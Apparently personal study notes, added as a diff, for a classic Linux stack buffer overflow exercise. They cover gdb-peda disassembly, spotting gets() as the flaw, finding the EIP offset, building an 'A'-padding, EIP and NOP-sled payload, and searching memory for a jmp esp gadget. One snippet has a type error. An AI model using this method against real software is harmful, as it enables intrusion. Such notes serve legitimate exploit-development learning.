@@ -1,0 +1,70 @@
+wiremask.eu
+
+gdb-peda is only on linux opstation
+
+
+parameter vs input
+
+
+./func yeet  -parameter
+
+./func
+enter a string: yeet - input
+
+
+gdb vulnerablefunction
+
+pdisas main 
+pdisas getuserinput (never thunk)
+
+
+what is vulnerable function
+<(gets)@plt>
+
+
+linbuff.py
+
+
+figure out how many it takes to break script
+never over 250
+generate numbers
+
+
+buff = "magicscript"
+
+print(buff)
+
+in gdb peda
+run <<< $(python linbuff.py) - FOR INPUT 
+run $(python linbuff.py) - FOR PARAMETER
+
+
+grab EIP hex value
+in wiremask paste it DONT HIT ENTER
+gives offset value.
+
+
+buff = 'A' * 62
+eip = 'B' * 4
+
+nop  = '\x90' * 10
+
+print(buff + eip + 10)
+make sure eip is all bbbb
+
+
+env - gdb vulnerablefunc
+show env 
+unset everything
+
+unset env LINES
+unset env COLUMNS
+run 
+overflow AAAAAAAAAAAAAAAAAAAAAAA
+
+info proc map
+
+grab below heap and right above stack
+
+
+find /b 0xf7de1000, 0xf7ffe000, 0xff, 0xe4
